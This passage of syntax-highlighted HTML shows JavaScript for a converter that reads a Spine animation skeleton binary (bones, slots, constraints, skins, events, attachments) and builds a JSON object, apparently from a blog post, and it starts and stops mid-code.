class="built_in">this</span>.json = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        SkeletonJsonConverter.prototype.convertToJson = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.json.skeleton = &#123;&#125;;</span><br><span class="line">            <span class="keyword">let</span> skeleton = <span class="built_in">this</span>.json.skeleton;</span><br><span class="line">            skeleton.hash = <span class="built_in">this</span>.readString();</span><br><span class="line">            <span class="keyword">if</span> (skeleton.hash.length == <span class="number">0x0</span>) skeleton.hash = <span class="literal">null</span>;</span><br><span class="line">            skeleton.spine = <span class="built_in">this</span>.readString();</span><br><span class="line">            <span class="keyword">if</span> (skeleton.spine.length == <span class="number">0x0</span>) skeleton.spine = <span class="literal">null</span>;</span><br><span class="line">            skeleton.width = <span class="built_in">this</span>.readFloat();</span><br><span class="line">            skeleton.height = <span class="built_in">this</span>.readFloat();</span><br><span class="line">            <span class="keyword">let</span> nonessential = <span class="built_in">this</span>.readBoolean();</span><br><span class="line">            <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                skeleton.fps = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                skeleton.images = <span class="built_in">this</span>.readString();</span><br><span class="line">                <span class="keyword">if</span> (skeleton.images.length == <span class="number">0x0</span>) skeleton.images = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.bones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">            <span class="keyword">let</span> bones = <span class="built_in">this</span>.json.bones;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; bones.length; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> boneData = &#123;&#125;;</span><br><span class="line">                boneData.name = <span class="built_in">this</span>.readString();</span><br><span class="line">                boneData.parent = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (i != <span class="number">0x0</span>) &#123;</span><br><span class="line">                    <span class="keyword">const</span> nonessential = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                    boneData.parent = bones[nonessential].name;</span><br><span class="line">                &#125;</span><br><span class="line">                boneData.rotation = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                boneData[<span class="string">&quot;x&quot;</span>] = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                boneData[<span class="string">&quot;y&quot;</span>] = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                boneData.scaleX = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                boneData.scaleY = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                boneData.shearX = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                boneData.shearY = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                boneData.length = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                boneData.transform = TransformMode[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                <span class="keyword">if</span> (nonessential) &#123;</span><br><span class="line">                    boneData.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                &#125;</span><br><span class="line">                bones[i] = boneData;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.slots = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">            <span class="keyword">let</span> slots = <span class="built_in">this</span>.json.slots;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> slotData = &#123;&#125;;</span><br><span class="line">                slotData.name = <span class="built_in">this</span>.readString();</span><br><span class="line">                <span class="keyword">const</span> boneData = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                slotData.bone = boneData.name;</span><br><span class="line">                slotData.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                slotData.darkColor = <span class="built_in">this</span>.readColor();</span><br><span class="line">                slotData.attachment = <span class="built_in">this</span>.readString();</span><br><span class="line">                slotData.blend = BlendMode[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                slots[i] = slotData;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json[<span class="string">&quot;ik&quot;</span>] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">            <span class="keyword">let</span> ik = <span class="built_in">this</span>.json[<span class="string">&quot;ik&quot;</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; ik.length; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> ikConstraints = &#123;&#125;;</span><br><span class="line">                ikConstraints.name = <span class="built_in">this</span>.readString();</span><br><span class="line">                ikConstraints.order = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                ikConstraints.bones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>; j &lt; ikConstraints.bones.length; j++) &#123;</span><br><span class="line">                    ikConstraints.bones[j] = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                &#125;</span><br><span class="line">                ikConstraints.target = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                ikConstraints.mix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                ikConstraints.bendPositive = <span class="built_in">this</span>.readByte() != <span class="number">0xff</span>;</span><br><span class="line">                ik[i] = ikConstraints;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.transform = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">            <span class="keyword">let</span> transform = <span class="built_in">this</span>.json.transform;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; transform.length; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> transformData = &#123;&#125;;</span><br><span class="line">                transformData.name = <span class="built_in">this</span>.readString();</span><br><span class="line">                transformData.order = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> bones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>, len = bones.length; j &lt; len; j++) &#123;</span><br><span class="line">                    bones[j] = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                &#125;</span><br><span class="line">                transformData.bones = bones;</span><br><span class="line">                transformData.target = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                transformData.rotation = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData[<span class="string">&quot;x&quot;</span>] = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                transformData[<span class="string">&quot;y&quot;</span>] = <span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale;</span><br><span class="line">                transformData.scaleX = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.scaleY = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.shearY = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.rotateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.translateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.scaleMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transformData.shearMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                transform[i] = transformData;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.path = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">            <span class="keyword">let</span> path = <span class="built_in">this</span>.json.path;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; path.length; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> pathData = &#123;&#125;;</span><br><span class="line">                pathData.name = <span class="built_in">this</span>.readString();</span><br><span class="line">                pathData.order = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                pathData.bones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>, len = pathData.bones.length; j &lt; len; j++) &#123;</span><br><span class="line">                    pathData.bones[j] = <span class="built_in">this</span>.json.bones[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                &#125;</span><br><span class="line">                pathData.target = <span class="built_in">this</span>.json.slots[<span class="built_in">this</span>.readInt(!![])].name;</span><br><span class="line">                pathData.positionMode = PositionMode[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                pathData.spacingMode = SpacingMode[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                pathData.rotateMode = RotateMode[<span class="built_in">this</span>.readInt(!![])];</span><br><span class="line">                pathData.rotation = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                pathData.position = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                <span class="keyword">if</span> (pathData.positionMode == <span class="string">&quot;fixed&quot;</span>) &#123;</span><br><span class="line">                    pathData.position *= <span class="built_in">this</span>.scale;</span><br><span class="line">                &#125;</span><br><span class="line">                pathData.spacing = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                <span class="keyword">if</span> (pathData.spacingMode == <span class="string">&quot;length&quot;</span> || pathData.spacingMode == <span class="string">&quot;fixed&quot;</span>) &#123;</span><br><span class="line">                    pathData.spacing *= <span class="built_in">this</span>.scale;</span><br><span class="line">                &#125;</span><br><span class="line">                pathData.rotateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                pathData.translateMix = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                path[i] = pathData;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.skins = &#123;&#125;;</span><br><span class="line">            <span class="built_in">this</span>.json.skinsName = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">            <span class="keyword">let</span> skins = <span class="built_in">this</span>.json.skins;</span><br><span class="line">            <span class="keyword">let</span> skinData = <span class="built_in">this</span>.readSkin(<span class="string">&quot;default&quot;</span>, nonessential);</span><br><span class="line">            <span class="keyword">if</span> (skinData != <span class="literal">null</span>) &#123;</span><br><span class="line">                skins.default = skinData;</span><br><span class="line">                <span class="built_in">this</span>.json.skinsName.push(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, len = <span class="built_in">this</span>.readInt(!![]); i &lt; len; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> skinName = <span class="built_in">this</span>.readString();</span><br><span class="line">                <span class="keyword">let</span> skin = <span class="built_in">this</span>.readSkin(skinName, nonessential);</span><br><span class="line">                skins[skinName] = skin;</span><br><span class="line">                <span class="built_in">this</span>.json.skinsName.push(skinName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.events = [];</span><br><span class="line">            <span class="built_in">this</span>.json.eventsName = [];</span><br><span class="line">            <span class="keyword">let</span> events = <span class="built_in">this</span>.json.events;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, len = <span class="built_in">this</span>.readInt(!![]); i &lt; len; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> eventName = <span class="built_in">this</span>.readString();</span><br><span class="line">                <span class="keyword">let</span> event = &#123;&#125;;</span><br><span class="line">                event.int = <span class="built_in">this</span>.readInt(![]);</span><br><span class="line">                event.float = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                event.string = <span class="built_in">this</span>.readString();</span><br><span class="line">                events[eventName] = event;</span><br><span class="line">                <span class="built_in">this</span>.json.eventsName[i] = eventName;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.json.animations = &#123;&#125;;</span><br><span class="line">            <span class="keyword">let</span> animations = <span class="built_in">this</span>.json.animations;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>, len = <span class="built_in">this</span>.readInt(!![]); i &lt; len; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> animationName = <span class="built_in">this</span>.readString();</span><br><span class="line">                <span class="keyword">let</span> animation = <span class="built_in">this</span>.readAnimation(animationName);</span><br><span class="line">                animations[animationName] = animation;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readByte = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.nextNum &lt; <span class="built_in">this</span>.data.length ? <span class="built_in">this</span>.data[<span class="built_in">this</span>.nextNum++] : <span class="literal">null</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readBoolean = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.readByte() != <span class="number">0x0</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readShort = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x8</span>) | <span class="built_in">this</span>.readByte();</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readInt = <span class="function"><span class="keyword">function</span> (<span class="params">optimizePositive</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> optimizePositive === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> (</span><br><span class="line">                    (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x18</span>) |</span><br><span class="line">                    (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x10</span>) |</span><br><span class="line">                    (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x8</span>) |</span><br><span class="line">                    <span class="built_in">this</span>.readByte()</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> b = <span class="built_in">this</span>.readByte();</span><br><span class="line">            <span class="keyword">let</span> result = b &amp; <span class="number">0x7f</span>;</span><br><span class="line">            <span class="keyword">if</span> ((b &amp; <span class="number">0x80</span>) != <span class="number">0x0</span>) &#123;</span><br><span class="line">                b = <span class="built_in">this</span>.readByte();</span><br><span class="line">                result |= (b &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">0x7</span>;</span><br><span class="line">                <span class="keyword">if</span> ((b &amp; <span class="number">0x80</span>) != <span class="number">0x0</span>) &#123;</span><br><span class="line">                    b = <span class="built_in">this</span>.readByte();</span><br><span class="line">                    result |= (b &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">0xe</span>;</span><br><span class="line">                    <span class="keyword">if</span> ((b &amp; <span class="number">0x80</span>) != <span class="number">0x0</span>) &#123;</span><br><span class="line">                        b = <span class="built_in">this</span>.readByte();</span><br><span class="line">                        result |= (b &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">0x15</span>;</span><br><span class="line">                        <span class="keyword">if</span> ((b &amp; <span class="number">0x80</span>) != <span class="number">0x0</span>) &#123;</span><br><span class="line">                            b = <span class="built_in">this</span>.readByte();</span><br><span class="line">                            result |= (b &amp; <span class="number">0x7f</span>) &lt;&lt; <span class="number">0x1c</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> optimizePositive ? result : (result &gt;&gt; <span class="number">0x1</span>) ^ -(result &amp; <span class="number">0x1</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.bytes2Float32 = <span class="function"><span class="keyword">function</span> (<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> sign = bytes &amp; <span class="number">0x80000000</span> ? -<span class="number">0x1</span> : <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">let</span> exponent = ((bytes &gt;&gt; <span class="number">0x17</span>) &amp; <span class="number">0xff</span>) - <span class="number">0x7f</span>;</span><br><span class="line">            <span class="keyword">let</span> significand = bytes &amp; ~(-<span class="number">0x1</span> &lt;&lt; <span class="number">0x17</span>);</span><br><span class="line">            <span class="keyword">if</span> (exponent == <span class="number">0x80</span>)</span><br><span class="line">                <span class="keyword">return</span> sign * (significand ? <span class="built_in">Number</span>.NaN : <span class="built_in">Number</span>.POSITIVE_INFINITY);</span><br><span class="line">            <span class="keyword">if</span> (exponent == -<span class="number">0x7f</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (significand == <span class="number">0x0</span>) <span class="keyword">return</span> sign * <span class="number">0x0</span>;</span><br><span class="line">                exponent = -<span class="number">0x7e</span>;</span><br><span class="line">                significand /= <span class="number">0x1</span> &lt;&lt; <span class="number">0x16</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> significand = (significand | (<span class="number">0x1</span> &lt;&lt; <span class="number">0x17</span>)) / (<span class="number">0x1</span> &lt;&lt; <span class="number">0x17</span>);</span><br><span class="line">            <span class="keyword">return</span> sign * significand * <span class="built_in">Math</span>.pow(<span class="number">0x2</span>, exponent);</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readFloat = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.bytes2Float32(</span><br><span class="line">                (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x18</span>) +</span><br><span class="line">                (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x10</span>) +</span><br><span class="line">                (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x8</span>) +</span><br><span class="line">                (<span class="built_in">this</span>.readByte() &lt;&lt; <span class="number">0x0</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readVertices = <span class="function"><span class="keyword">function</span> (<span class="params">vertexCount</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> verticesLength = vertexCount &lt;&lt; <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.readBoolean()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.readFloatArray(verticesLength, <span class="built_in">this</span>.scale);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> bonesArray = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; vertexCount; i++) &#123;</span><br><span class="line">                <span class="keyword">let</span> dataLength = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                bonesArray.push(dataLength);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>; j &lt; dataLength; j++) &#123;</span><br><span class="line">                    bonesArray.push(<span class="built_in">this</span>.readInt(!![]));</span><br><span class="line">                    bonesArray.push(<span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale);</span><br><span class="line">                    bonesArray.push(<span class="built_in">this</span>.readFloat() * <span class="built_in">this</span>.scale);</span><br><span class="line">                    bonesArray.push(<span class="built_in">this</span>.readFloat());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bonesArray;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readFloatArray = <span class="function"><span class="keyword">function</span> (<span class="params">length, scale</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(length);</span><br><span class="line">            <span class="keyword">if</span> (scale == <span class="number">0x1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                    array[i] = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; length; i++) &#123;</span><br><span class="line">                    array[i] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readShortArray = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">let</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                array[i] = <span class="built_in">this</span>.readShort();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readIntArray = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> n = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">let</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; n; i++) array[i] = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">return</span> array;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readHex = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> hex = <span class="built_in">this</span>.readByte().toString(<span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">return</span> hex.length == <span class="number">0x2</span> ? hex : <span class="string">&quot;0&quot;</span> + hex;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readColor = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.readHex() + <span class="built_in">this</span>.readHex() + <span class="built_in">this</span>.readHex() + <span class="built_in">this</span>.readHex();</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> charCount = <span class="built_in">this</span>.readInt(<span class="built_in">this</span>, !![]);</span><br><span class="line">            <span class="keyword">switch</span> (charCount) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x1</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            charCount--;</span><br><span class="line">            <span class="built_in">this</span>.chars = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">let</span> charIndex = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; charCount;) &#123;</span><br><span class="line">                charIndex = <span class="built_in">this</span>.readByte();</span><br><span class="line">                <span class="keyword">switch</span> (charIndex &gt;&gt; <span class="number">0x4</span>) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0xc</span>:</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0xd</span>:</span><br><span class="line">                        <span class="built_in">this</span>.chars += <span class="built_in">String</span>.fromCharCode(</span><br><span class="line">                            ((charIndex &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">0x6</span>) | (<span class="built_in">this</span>.readByte() &amp; <span class="number">0x3f</span>)</span><br><span class="line">                        );</span><br><span class="line">                        i += <span class="number">0x2</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0xe</span>:</span><br><span class="line">                        <span class="built_in">this</span>.chars += <span class="built_in">String</span>.fromCharCode(</span><br><span class="line">                            ((charIndex &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0xc</span>) |</span><br><span class="line">                            ((<span class="built_in">this</span>.readByte() &amp; <span class="number">0x3f</span>) &lt;&lt; <span class="number">0x6</span>) |</span><br><span class="line">                            (<span class="built_in">this</span>.readByte() &amp; <span class="number">0x3f</span>)</span><br><span class="line">                        );</span><br><span class="line">                        i += <span class="number">0x3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="built_in">this</span>.chars += <span class="built_in">String</span>.fromCharCode(charIndex);</span><br><span class="line">                        i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.chars;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readSkin = <span class="function"><span class="keyword">function</span> (<span class="params">slotIndex, nonessential</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> slotCount = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">            <span class="keyword">if</span> (slotCount == <span class="number">0x0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">let</span> skin = &#123;&#125;;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0x0</span>; i &lt; slotCount; i++) &#123;</span><br><span class="line">                <span class="keyword">const</span> slotIndex = <span class="built_in">this</span>.readInt(!![]);</span><br><span class="line">                <span class="keyword">const</span> slot = &#123;&#125;;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0x0</span>, n = <span class="built_in">this</span>.readInt(!![]); j &lt; n; j++) &#123;</span><br><span class="line">                    <span class="keyword">let</span> name = <span class="built_in">this</span>.readString();</span><br><span class="line">                    <span class="keyword">let</span> attachment = <span class="built_in">this</span>.readAttachment(name, nonessential);</span><br><span class="line">                    <span class="keyword">if</span> (attachment != <span class="literal">null</span>) &#123;</span><br><span class="line">                        slot[name] = attachment;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                skin[<span class="built_in">this</span>.json.slots[slotIndex].name] = slot;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> skin;</span><br><span class="line">        &#125;;</span><br><span class="line">        SkeletonJsonConverter.prototype.readAttachment = <span class="function"><span class="keyword">function</span> (<span class="params">attachmentName, nonessential</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">let</span> scale = <span class="built_in">this</span>.scale;</span><br><span class="line">            <span class="keyword">let</span> name = <span class="built_in">this</span>.readString();</span><br><span class="line">            <span class="keyword">if</span> (name == <span class="literal">null</span>) name = attachmentName;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> path,</span><br><span class="line">                n,</span><br><span class="line">                region = &#123;&#125;,</span><br><span class="line">                box = &#123;&#125;,</span><br><span class="line">                mesh = &#123;&#125;,</span><br><span class="line">                linkdeMesh = &#123;&#125;;</span><br><span class="line">            <span class="keyword">let</span> array;</span><br><span class="line">            <span class="keyword">let</span> point = &#123;&#125;;</span><br><span class="line">            <span class="keyword">let</span> clipping = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (AttachmentType[<span class="built_in">this</span>.readByte()]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;region&quot;</span>:</span><br><span class="line">                    path = <span class="built_in">this</span>.readString();</span><br><span class="line">                    <span class="keyword">if</span> (path == <span class="literal">null</span>) path = name;</span><br><span class="line">                    region.type = <span class="string">&quot;region&quot;</span>;</span><br><span class="line">                    region.name = name;</span><br><span class="line">                    region.path = path.trim();</span><br><span class="line">                    region.rotation = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    region[<span class="string">&quot;x&quot;</span>] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    region[<span class="string">&quot;y&quot;</span>] = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    region.scaleX = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    region.scaleY = <span class="built_in">this</span>.readFloat();</span><br><span class="line">                    region.width = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    region.height = <span class="built_in">this</span>.readFloat() * scale;</span><br><span class="line">                    region.color = <span class="built_in">this</span>.readColor();</span><br><span class="line">                    <span class="keyword">return</span> region;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;boundingbox&quot;</span>:</span><br><span class="line">                    box.type = <span class="string">&quot;boundingbox&quot;</span>;</span><br><span class="line">                    box.name = name;</span><br><span class="line">              